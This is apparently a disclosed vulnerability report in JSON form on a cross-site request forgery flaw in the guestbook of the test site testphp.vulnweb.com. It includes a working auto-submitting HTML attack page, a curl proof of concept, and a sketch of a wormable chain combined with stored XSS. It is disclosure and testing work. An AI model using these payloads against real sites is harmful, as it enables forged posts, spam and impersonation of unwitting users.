{
  "id": 800005,
  "title": "Cross-Site Request Forgery (CSRF) on Guestbook Allows Unauthorized Message Posting on testphp.vulnweb.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "visibility": "full",
  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
  "reporter": {"username": "resurface_demo"},
  "weakness": {"id": 352, "name": "Cross-Site Request Forgery (CSRF)"},
  "vulnerability_information": "## Summary\nThe guestbook form at `http://testphp.vulnweb.com/guestbook.php` does not implement any CSRF protection — there is no CSRF token, no referrer validation, and no SameSite cookie attribute. An attacker can craft a malicious page that automatically submits guestbook entries on behalf of any visiting user.\n\n## Steps to Reproduce\n1. Examine the guestbook form source at `http://testphp.vulnweb.com/guestbook.php`:\n```html\n<form action=\"\" method=\"post\" name=\"faddentry\">\n  <input type=\"hidden\" name=\"name\" value=\"anonymous user\">\n  <textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>\n  <br>\n  <input type=\"submit\" name=\"submit\" value=\"add message\">\n</form>\n```\n2. Note: No CSRF token is present in the form. No anti-CSRF headers are validated.\n3. Create the following HTML file and host it on an attacker-controlled server:\n```html\n<!DOCTYPE html>\n<html>\n<body onload=\"document.getElementById('csrf').submit()\">\n  <h1>Loading...</h1>\n  <form id=\"csrf\" action=\"http://testphp.vulnweb.com/guestbook.php\" method=\"POST\" style=\"display:none\">\n    <input name=\"name\" value=\"CSRF Victim\">\n    <input name=\"text\" value=\"This message was posted via CSRF without the user's knowledge. Visit http://evil.com for free prizes!\">\n    <input name=\"submit\" value=\"add message\">\n  </form>\n</body>\n</html>\n```\n4. When any user visits the attacker's page, their browser automatically submits a guestbook entry to testphp.vulnweb.com.\n5. Visit `http://testphp.vulnweb.com/guestbook.php` to confirm the message was posted.\n\n## Proof of Concept\nDirect curl demonstrates the lack of any CSRF validation:\n```bash\ncurl -X POST 'http://testphp.vulnweb.com/guestbook.php' \\\n  -d 'name=CSRFBot&text=This+was+posted+without+any+CSRF+token&submit=add+message'\n```\nThe message is accepted and displayed on the guestbook page without any token or origin verification.\n\n## Impact\n- An attacker can post arbitrary messages in the guestbook on behalf of any user who visits a malicious page\n- Combined with the Stored XSS vulnerability in the guestbook, this enables a wormable attack chain: CSRF posts XSS payload → visitors execute XSS → XSS triggers more CSRF posts\n- Can be used for spam injection, defacement, and social engineering attacks\n- The hidden `name` field can be overridden, allowing the attacker to impersonate any identity",
  "disclosed_at": "2025-07-10T11:30:00.000Z",
  "bounty_amount": "750.0"
}
